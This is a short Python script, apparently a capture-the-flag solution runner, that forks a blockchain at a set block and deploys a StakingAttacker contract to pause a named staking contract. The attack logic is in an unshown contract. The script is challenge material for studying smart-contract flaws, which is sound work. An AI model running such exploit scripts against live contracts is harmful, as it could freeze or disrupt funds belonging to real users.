from ape import accounts, project, Contract
from .utils.helper import fork, get_block

BLOCK = 7566052
STAKING_CONTRACT = "0x805F02142680f853A9c0E5D5d6F49AEc28C31E8b"


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # setting up attacker
    attacker = accounts.test_accounts[0]

    # fork chain at block height
    print(f"\n--- Forking chain at block height: {BLOCK} ---\n")
    fork(BLOCK)
    assert get_block() == BLOCK

    # get challenge contract
    print("\n--- Getting Challenge Contracts ---\n")
    staking = Contract(STAKING_CONTRACT)

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = project.StakingAttacker.deploy(
        staking.address,
        sender=attacker,
    )
    attacker_contract.start_attack(sender=attacker)
    attacker_contract.finish_attack(sender=attacker)

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: You are have paused the staking contract ---\n")

    assert staking.paused()

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
